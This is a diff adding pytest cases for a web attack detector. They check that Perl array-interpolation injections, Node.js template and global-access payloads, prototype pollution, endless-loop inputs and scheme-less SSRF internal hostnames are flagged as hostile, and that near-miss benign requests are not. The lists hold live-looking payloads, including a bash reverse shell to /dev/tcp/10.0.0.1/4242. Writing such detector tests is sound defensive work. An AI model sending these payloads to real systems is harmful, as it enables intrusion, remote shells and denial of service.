@@ -1408,3 +1408,273 @@ def test_ssrf_rules_leave_ordinary_urls_and_numbers_alone(engine: RuleEngine, ta
 
     hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
     assert not hostile, f"{target!r} was called hostile by {hostile}"
+
+
+#: Perl's array-interpolation attack: `@{[ ... ]}` inside a string a template
+#: renders, which Perl evaluates as code. The largest single shape in CRS family
+#: 934's misses — 35 of 122 when this was written, more than Node.js and
+#: prototype pollution together.
+PERL_INTERPOLATION: list[str] = [
+    # The canonical form, and the payloads that go in it.
+    "/get?x=@{[system 'whoami']}",
+    "/get?x=@{[exec 'whoami']}",
+    "/get?x=@{[qx{whoami}]}",
+    "/get?x=@{[eval{system 'id'}]}",
+    "/get?x=@{[require file::find]}",
+    "/get?x=@{[getpwuid($>)]}",
+    "/get?x=@{[keys %ENV]}",
+    "/get?x=@{[crypt($passwd, 'xx')]}",
+    "/get?x=@{[$$]}",
+    "/get?x=@{[rand 100]}",
+    "/get?x=@{[uc 'hello']}",
+    "/get?x=@{[core::time()]}",
+    "/get?x=@{[sort { $a <=> $b } (3,2,1)]}",
+    "/get?x=@{[system 'bash -c bash -i >& /dev/tcp/10.0.0.1/4242 0>&1']}",
+    # Whitespace anywhere, which is why the pattern cannot be a literal.
+    "/get?x=@{ [ uc 'hello' ] }",
+    '/get?x=@{ [ system "id" ] }',
+    "/get?x=@{[ system 'id' ]}",
+    # Wrapped, prefixed and decorated — all still an interpolation.
+    "/get?x=@{[ (system 'id') ]}",
+    "/get?x=@{[ &system 'id' ]}",
+    "/get?x=@{[ !!system 'id' ]}",
+    "/get?x=@{[ core::system 'id' ]}",
+    "/get?x=@{[ do { system 'id' } ]}",
+    "/get?x=@{[ system qq{whoami} ]}",
+    "/get?x=@{[system 'id' #cmt ]}",
+    "/get?x=@@{[core::time()]}",
+    "/get?x=@@@@{[core::time()]}",
+    # Never closed, or closed and then followed by rubbish. The opening is the
+    # evidence; a payload that fails to parse was still sent.
+    "/get?x=@{[system 'id']",
+    "/get?x=@{[system 'id']extra",
+    "/get?x=@{[test][test2]}",
+    # In the parameter *name* rather than its value, which is why this matches
+    # the whole query rather than something after an `=`.
+    "/get?@{[getpwuid($>)]}=value",
+]
+
+#: The near misses. Nothing in the CRS corpus's harmless half looks like a Perl
+#: interpolation, so these are shapes a real shop would send that share a
+#: character or two with it.
+PERL_BENIGN: list[str] = [
+    "/get?q=fish @ market",
+    "/get?email=owner@example.test",
+    # `${name}` belongs here by every argument and is deliberately absent.
+    # `php_superglobal` calls any `${` PHP variable interpolation at high
+    # severity, and no corpus this project holds contains a single `${` — not
+    # one in 237,278 real requests, none in the CRS harmless half. So the rule
+    # has never been tested against benign template syntax, and asserting it is
+    # wrong would be inventing the evidence. Recorded in TODO.md instead.
+    "/get?style=@media screen",
+    "/get?x=@{here}",
+    "/get?handle=@someone",
+    "/get?list=a[0]",
+]
+
+
+@pytest.mark.parametrize("target", PERL_INTERPOLATION)
+def test_perl_array_interpolation_is_caught(engine: RuleEngine, target: str) -> None:
+    """`@{[ ... ]}` is Perl interpolating an array literal, and anything inside
+    the brackets runs. It has no other use: nobody sends that sequence by
+    accident, which is why one pattern closes thirty-five cases."""
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels), (
+        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
+    )
+
+
+@pytest.mark.parametrize("target", PERL_BENIGN)
+def test_an_at_sign_alone_is_not_perl(engine: RuleEngine, target: str) -> None:
+    """The brace and the bracket are both required. An `@` is an email, a CSS
+    at-rule and a social handle long before it is Perl."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
+
+
+#: Reaching Node's globals through a string the application evaluates.
+NODEJS_GLOBALS: list[str] = [
+    "/get?foo=process.env",
+    '/get?foo=process["env"]',
+    "/get?foo=process[req.query.a",
+    "/get?foo=process[mainModule",
+    "/get?foo=console.info(1)",
+    '/get?foo=console["info"](1)',
+    "/get?foo=console.info.call(this,1)",
+    "/get?foo=require[req.query.a",
+    "/get?foo=module.exports=",
+    "/get?foo=new Function (",
+    "/get?foo=this.constructor.constructor",
+    "/get?foo=__js_function",
+    "/get?foo=eval(String.fromCharCode",
+    # Inside a template, which is how it reaches an application at all.
+    "/get?foo=#{process.binding(foo).spawn(foo2)}",
+    "/get?foo=#{require.main.constructor._load(foo).readdirSync(foo2)}",
+    "/get?foo=#{require.main.constructor._load('child_process').spawn('foo',['bar'])}",
+    "/get?foo=#{require.main.constructor._load('fs').write(fd, str, 0, null, {})}",
+]
+
+#: Poisoning `Object.prototype` through the parameter *name*, which is the one
+#: place in this tree an attack lives left of the `=`.
+NODEJS_POLLUTION: list[str] = [
+    "/get?__proto__[test]=test",
+    "/get?__proto__.test=test",
+    '/get?__proto__[test]={"json":"value"}',
+    "/get?__proto__[jquery]=x",
+    "/get?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()",
+    "/get?constructor.prototype.test=test",
+    "/get?constructor.prototype. test=test",
+    "/get?constructor[prototype][test]=test",
+    "/get?x=x&a[constructor][prototype]=image&a[constructor][prototype][onerror]=a",
+]
+
+#: A loop that never ends, which is a denial of service rather than an entry.
+#: **The harmless half draws the line one character away**: `while(!true)`
+#: evaluates false and never runs, and the corpus certifies it harmless.
+NODEJS_ENDLESS: list[str] = [
+    "/get?eval=while(true);",
+    "/get?eval=while((true)))",
+    "/get?eval=while(!false)",
+    "/get?eval=while(!0);",
+    "/get?eval=while(!-0);",
+    '/get?eval=while(!"");',
+    "/get?eval=while(!'');",
+    "/get?eval=while(!``);",
+    "/get?eval=while(!null)",
+    "/get?eval=while(!undefined)",
+    "/get?eval=while(!NaN)",
+    "/get?eval=while(!!{});",
+    "/get?eval=while(!![]);",
+    '/get?eval=while(!!"");',
+    "/get?eval=while(!!'');",
+    "/get?eval=while(!!``);",
+    "/get?eval=while(Infinity);",
+    "/get?eval=while(-Infinity);",
+    "/get?eval=while(-1);",
+    "/get?eval=while(new Date);",
+    "/get?eval=while(this);",
+    "/get?eval=while(String);",
+]
+
+#: Every one of these is certified harmless by the CRS corpus, and they are the
+#: specification for the three lists above.
+NODEJS_BENIGN: list[str] = [
+    # A bare global with nothing reached off it. `process.` is not `process.env`.
+    "/get?foo=process.",
+    "/get?foo=console.",
+    # A loop whose condition is false: it never runs, so it is not a loop.
+    "/get?eval=while(!true);",
+    # English that happens to contain a keyword.
+    "/get?text=while (foo) is bar.",
+    # Template syntax with an ordinary name inside. The braces are not the
+    # evidence — what is reached through them is.
+    "/get?x=#{name}",
+    "/get?x={{username}}",
+    "/get?x=<%=title%>",
+    # `{% if true %}49{% endif %}` was on this list for a day, under a comment
+    # saying the corpus certifies it harmless. The corpus says the opposite: it
+    # is an SSTI probe, and an attack nothing here catches yet. A benign list is
+    # a list of things a rule must *never* match, so an attack on it does not
+    # merely go unnoticed — it blocks the rule that would one day catch it.
+]
+
+
+@pytest.mark.parametrize("target", NODEJS_GLOBALS)
+def test_reaching_a_node_global_is_caught(engine: RuleEngine, target: str) -> None:
+    """`process`, `require`, `module` and `console` are how a Node payload gets
+    out of the template it was interpolated into and into the runtime."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert hostile, f"nothing called {target!r} hostile"
+
+
+@pytest.mark.parametrize("target", NODEJS_POLLUTION)
+def test_prototype_pollution_in_a_parameter_name_is_caught(engine: RuleEngine, target: str) -> None:
+    """**The payload is left of the `=`, which nothing else in this tree does.**
+    A pattern written out of habit anchors on a value and misses all nine."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert hostile, f"nothing called {target!r} hostile"
+
+
+@pytest.mark.parametrize("target", NODEJS_ENDLESS)
+def test_a_loop_that_never_ends_is_caught(engine: RuleEngine, target: str) -> None:
+    """Every condition here is always truthy, so the loop runs until the process
+    is killed. The list is an enumeration rather than a pattern because the set
+    of always-true JavaScript literals is finite and `while(!true)` is not in
+    it."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert hostile, f"nothing called {target!r} hostile"
+
+
+@pytest.mark.parametrize("target", NODEJS_BENIGN)
+def test_the_node_rules_leave_the_certified_harmless_alone(engine: RuleEngine, target: str) -> None:
+    """Straight out of the CRS corpus's harmless half for family 934, and the
+    reason each of the three rules above is shaped the way it is."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
+
+
+#: An internal host named rather than addressed. `ssrf_internal_target` wants a
+#: scheme in front — `http://localhost` — and these carry none, which is how
+#: fourteen corpus cases walked past it.
+SSRF_INTERNAL_NAMES: list[str] = [
+    "/get/test?url=localhost/",
+    "/get/test?url=localhost.localdomain/",
+    "/get/test?url=localhost4/",
+    "/get/test?url=localhost4.localdomain4/",
+    "/get/test?url=ipv6-localhost/",
+    "/get/test?url=ip6-loopback/",
+    "/get/test?url=host.docker.internal/",
+    "/get/test?url=gateway.docker.internal/",
+    "/get/test?url=kubernetes.docker.internal/",
+    "/get/test?url=host.containers.internal/",
+    "/get/test?url=kubernetes.default.svc.cluster.local/",
+    # Public names whose DNS resolves to 127.0.0.1 — the trick is that they
+    # look external and are not.
+    "/get/test?url=localtest.me/",
+    "/get/test?url=lvh.me/",
+]
+
+#: The line this must not cross.
+SSRF_NAME_BENIGN: list[str] = [
+    # Certified harmless by the corpus: a public host, no scheme, same shape.
+    "/get/test?url=example.com/",
+    # The word in prose rather than as a destination. A shop that sells
+    # developer tools has customers who search for this.
+    "/search?q=how to run localhost",
+    "/search?q=localhost tutorial",
+    "/get?note=see localhost docs",
+]
+
+
+@pytest.mark.parametrize("target", SSRF_INTERNAL_NAMES)
+def test_an_internal_host_named_without_a_scheme_is_caught(engine: RuleEngine, target: str) -> None:
+    """A parameter whose value *is* one of these names is a fetch instruction
+    pointing back inside, whether or not somebody wrote `http://` in front."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert hostile, f"nothing called {target!r} hostile"
+
+
+@pytest.mark.parametrize("target", SSRF_NAME_BENIGN)
+def test_the_word_localhost_in_prose_is_not_an_address(engine: RuleEngine, target: str) -> None:
+    """**The value has to *be* the host, not merely contain the word.** A rule
+    matching `localhost` anywhere would take every search a developer-tools shop
+    receives, which is the same mistake `attack/windows.yaml` exists to avoid
+    with `for` and `time`."""
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
